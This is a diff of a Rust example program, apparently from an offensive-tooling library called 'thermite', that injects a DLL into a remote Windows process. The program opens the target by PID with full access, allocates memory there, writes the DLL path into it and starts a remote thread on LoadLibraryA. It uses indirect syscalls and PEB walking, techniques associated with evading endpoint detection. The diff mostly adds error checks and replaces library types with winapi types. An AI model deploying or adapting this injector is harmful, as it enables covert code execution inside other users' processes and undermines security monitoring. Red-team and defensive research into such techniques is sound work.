@@ -4,17 +4,26 @@
 use std::{mem, process};
 use std::ffi::c_void;
 use std::ops::Not;
+use std::os::windows::raw::HANDLE;
 use std::path::{Path, PathBuf};
+use std::process::exit;
 use std::ptr::null;
+
+use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
+use winapi::shared::ntstatus::STATUS_SUCCESS;
+use winapi::um::winnt::{GENERIC_EXECUTE, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_ALL_ACCESS};
 
 use thermite::{debug, error, info};
 use thermite::indirect_syscall as syscall;
-use thermite::models::windows::*;
-use thermite::models::windows::nt_status::NtStatus;
-use thermite::models::windows::peb_teb::UnicodeString;
-use thermite::models::windows::system_info::ClientId;
 use thermite::peb_walk::{get_function_address, get_module_address};
 
+
+#[repr(C)]
+#[derive(Debug, Clone)]
+pub struct ClientId {
+	pub unique_process: HANDLE,
+	pub unique_thread: HANDLE,
+}
 
 /// Read the PID and the DLL Path from the program's command line arguments,
 /// if a valid PID and a valid DLL Path is read, it calls the injector function
@@ -25,18 +34,18 @@ fn main() {
 	let args: Vec<String> = std::env::args().collect::<Vec<String>>();
 	if args.len() < 3 {
 		error!("Usage: dll_injector.exe <PID> <Path to DLL>");
-		process::exit(NtStatus::StatusAssertionFailure as _);
+		exit(-1);
 	}
 	// Parses the PID, again quitting if it fails
 	let pid: u32 = args[1].parse::<u32>().ok().unwrap_or_else(|| {
 		error!("Failed to parse target PID");
-		process::exit(NtStatus::StatusBadData as _);
+		exit(-1);
 	});
 
 	// Then we parse the DLL path, and quit if we cannot parse it at all.
 	let binding = args[2].parse::<PathBuf>().ok().unwrap_or_else(|| {
 		error!("Failed to parse DLL Path");
-		process::exit(NtStatus::StatusBadData as _);
+		exit(-1);
 	});
 	let dll = binding.as_path();
 
@@ -44,9 +53,8 @@ fn main() {
 	if dll.is_file().not()
 		|| dll.is_absolute().not() {
 		error!("Please provide an absolute path to your DLL.");
-		process::exit(NtStatus::StatusAssertionFailure as _);
+		exit(-1);
 	}
-
 	// Run the actual injector
 	injector(pid, dll.to_str().unwrap());
 }
@@ -55,7 +63,14 @@ fn main() {
 /// This function demonstrate how to inject a DLL in a remote process using direct syscalls
 /// Arguments: PID of the target process and the absolute path to the DLL to inject
 fn injector(pid: u32, dll_path: &str) {
-	let oa_process = ObjectAttributes::default();
+	let oa_process = OBJECT_ATTRIBUTES {
+		Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as _,
+		RootDirectory: 0u32 as _,
+		ObjectName: 0u32 as _,
+		Attributes: 0,
+		SecurityDescriptor: 0u32 as _,
+		SecurityQualityOfService: 0u32 as _,
+	};
 	let mut thread_handle: isize = 0;
 	let mut process_handle: isize = -1;
 
@@ -64,15 +79,18 @@ fn injector(pid: u32, dll_path: &str) {
 		unique_thread: 0 as _,
 	};
 
-	syscall!("NtOpenProcess",
+	let status = syscall!("NtOpenProcess",
 	    &mut process_handle, //  [out]          PHANDLE            ProcessHandle,
 	    PROCESS_ALL_ACCESS,  //  [in]           ACCESS_MASK        DesiredAccess,
 	    &oa_process,         //  [in]           POBJECT_ATTRIBUTES ObjectAttributes,
 	    &client_id);         //  [in, optional] PCLIENT_ID         client_id
+	if status != STATUS_SUCCESS {
+		error!("Failed to open remote process {}", status);
+		exit(status);
+	}
 	
 	let mut buf_size: usize = dll_path.len();
 	let mut base_addr: *mut c_void = 0u32 as _;
-
 	let nt_status = syscall!("NtAllocateVirtualMemory",
 	    process_handle,           // [in]      HANDLE   ProcessHandle,
 	    &mut base_addr,           // [in, out] PVOID    *BaseAddress,
@@ -107,9 +125,8 @@ fn injector(pid: u32, dll_path: &str) {
 		let kernel32_ptr = get_module_address("kernel32.dll").unwrap();
 		get_function_address("LoadLibraryA", kernel32_ptr).unwrap()
 	};
-
 	// Create a remote thread in target process
-	syscall!("NtCreateThreadEx",
+	let status = syscall!("NtCreateThreadEx",
 	    &mut thread_handle,    // [out]          PHANDLE ThreadHandle,
 	    GENERIC_EXECUTE,       // [in]           ACCESS_MASK DesiredAccess,
 	    null::<*mut c_void>(), // [in, optional] POBJECT_ATTRIBUTES ObjectAttributes,
@@ -121,7 +138,10 @@ fn injector(pid: u32, dll_path: &str) {
 	    null::<*mut c_void>(), // [in, optional] SIZE_T StackSize,
 	    null::<*mut c_void>(), // [in, optional] SIZE_T MaximumStackSize,
 	    null::<*mut c_void>());// [in, optional] PVOID AttributeList
-
+	if status != STATUS_SUCCESS {
+		error!("Failed to create remote thread {}", status);
+		exit(status);
+	}
 	// Wait for the thread to execute
 	// Timeout is a null pointer, so we wait indefinitely
 	syscall!("NtWaitForSingleObject",
